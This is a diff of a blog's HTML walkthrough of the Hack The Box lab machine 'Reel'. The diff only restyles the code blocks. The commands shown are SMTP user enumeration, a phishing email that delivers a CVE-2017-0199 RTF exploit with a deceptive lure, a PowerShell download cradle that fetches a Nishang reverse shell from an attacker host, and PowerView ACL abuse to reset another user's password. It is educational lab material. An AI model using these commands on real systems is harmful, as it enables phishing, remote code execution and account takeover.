@@ -170,7 +170,8 @@ new format / converted documents will be saved here.
 
 <p>the command is:</p>
 
-<p><code class="language-plaintext highlighter-rouge">smtp-user-enum -M VRFY -U users.txt -t 10.10.10.77</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smtp-user-enum <span class="nt">-M</span> VRFY <span class="nt">-U</span> users.txt <span class="nt">-t</span> 10.10.10.77
+</code></pre></div></div>
 
 <p>That takes a while to run. And it comes up short. <em>So we move on…</em></p>
 
@@ -236,13 +237,13 @@ new format / converted documents will be saved here.
 </ul>
 
 <p>Our command is:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sendEmail \
--t nico@megabank.com \
--f review@megabank.com \
--s 10.10.10.77 \
--u 'Document for Review' \
--a /opt/CVE-2017-0199/review.rtf \
--m 'Kindly review the attached document. Just press OK if you get an error while opening it and it should be fine.'
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sendEmail <span class="se">\</span>
+<span class="nt">-t</span> nico@megabank.com <span class="se">\</span>
+<span class="nt">-f</span> review@megabank.com <span class="se">\</span>
+<span class="nt">-s</span> 10.10.10.77 <span class="se">\</span>
+<span class="nt">-u</span> <span class="s1">'Document for Review'</span> <span class="se">\</span>
+<span class="nt">-a</span> /opt/CVE-2017-0199/review.rtf <span class="se">\</span>
+<span class="nt">-m</span> <span class="s1">'Kindly review the attached document. Just press OK if you get an error while opening it and it should be fine.'</span>
 </code></pre></div></div>
 
 <p>We try to look non-suspicous as possible. And use a subtle message in the body to have the user click ‘OK’ if he gets an error message (<em>which does happen with this exploit</em>).</p>
@@ -280,7 +281,8 @@ new format / converted documents will be saved here.
 
 <p>Switching to <strong>PowerShell</strong> from <strong>CMD</strong> can be done with the below command using the famous <strong>Nishang shell</strong> (https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) adding the <code class="language-plaintext highlighter-rouge">Invoke-PowerShellTcp</code> call at the bottom of the <code class="language-plaintext highlighter-rouge">.ps1</code></p>
 
-<p><code class="language-plaintext highlighter-rouge">powershell "IEX(New-Object Net.webClient).downloadString('http://10.10.16.7:8000/nishang.ps1')"</code></p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell <span class="s2">"IEX(New-Object Net.webClient).downloadString('http://10.10.16.7:8000/nishang.ps1')"</span>
+</code></pre></div></div>
 
 <p><em>To run the</em> <code class="language-plaintext highlighter-rouge">Invoke-BloodHound</code> <em>method</em>, We import the <code class="language-plaintext highlighter-rouge">SharpHound.ps1</code> script into memory using the same we ran <code class="language-plaintext highlighter-rouge">Nishang.ps1</code>:</p>
 
@@ -312,9 +314,13 @@ new format / converted documents will be saved here.
 
 <p><img src="/assets/Reel/set-dom-obj-owner.jpg" alt="set-dom-obj-owner" /></p>
 
-<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">Set-DomainObjectOwner -Identity herman -OwnerIdentity nico</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-DomainObjectOwner</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">herman</span><span class="w"> </span><span class="nt">-OwnerIdentity</span><span class="w"> </span><span class="nx">nico</span><span class="w">
+</span></code></pre></div></div>
 
-<p>We will need to follow up with <code class="language-plaintext highlighter-rouge">Add-DomainObjectAcl -TargetIdentity herman -PrincipalIdentity nico -Rights ResetPassword</code></p>
+<p>We will need to follow up with:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Add-DomainObjectAcl</span><span class="w"> </span><span class="nt">-TargetIdentity</span><span class="w"> </span><span class="nx">herman</span><span class="w"> </span><span class="nt">-PrincipalIdentity</span><span class="w"> </span><span class="nx">nico</span><span class="w"> </span><span class="nt">-Rights</span><span class="w"> </span><span class="nx">ResetPassword</span><span class="w">
+</span></code></pre></div></div>
 
 <p><img src="/assets/Reel/add-dom-object-acl.jpg" alt="add-dom-object-acl" /></p>
 
@@ -324,11 +330,13 @@ new format / converted documents will be saved here.
 
 <p>We create a <code class="language-plaintext highlighter-rouge">secure string</code> object using:</p>
 
-<p><code class="language-plaintext highlighter-rouge">$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force</code></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$UserPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'Password123!'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
+</span></code></pre></div></div>
 
 <p>and set the password:</p>
 
-<p><code class="language-plaintext highlighter-rouge">Set-DomainUserPassword -Identity herman -AccountPassword $UserPassword</code></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-DomainUserPassword</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">herman</span><span class="w"> </span><span class="nt">-AccountPassword</span><span class="w"> </span><span class="nv">$UserPassword</span><span class="w">
+</span></code></pre></div></div>
 
 <h3 id="logging-in-as-herman-and-joining-the-backup_admins-group">Logging in as herman and joining the <code class="language-plaintext highlighter-rouge">backup_admins</code> group</h3>
 
@@ -344,10 +352,10 @@ new format / converted documents will be saved here.
 
 <p>We first <em>relog</em> to <em>refresh our access</em> and check our newly-found acccess using <code class="language-plaintext highlighter-rouge">PowerShell</code>:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ErrorActionPreference = 'silentlycontinue'
-ls -recurse -force | ? {$_.fullname -notmatch 'AppData|Application Data|Local Settings'} | ? {(get-acl $_.fullname ).accesstostring -like '*Backup_admins*'} | select -expand fullname
-$ErrorActionPreference = 'continue'
-</code></pre></div></div>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="bp">$Error</span><span class="n">ActionPreference</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'silentlycontinue'</span><span class="w">
+</span><span class="n">ls</span><span class="w"> </span><span class="nt">-recurse</span><span class="w"> </span><span class="nt">-force</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">fullname</span><span class="w"> </span><span class="o">-notmatch</span><span class="w"> </span><span class="s1">'AppData|Application Data|Local Settings'</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="w"> </span><span class="p">{(</span><span class="n">get-acl</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">fullname</span><span class="w"> </span><span class="p">)</span><span class="o">.</span><span class="nf">accesstostring</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s1">'*Backup_admins*'</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nt">-expand</span><span class="w"> </span><span class="nx">fullname</span><span class="w">
+</span><span class="bp">$Error</span><span class="n">ActionPreference</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'continue'</span><span class="w">
+</span></code></pre></div></div>
 
 <p><img src="/assets/Reel/file-access-as-backup-admins.jpg" alt="file-access-as-backup-admins" /></p>
 
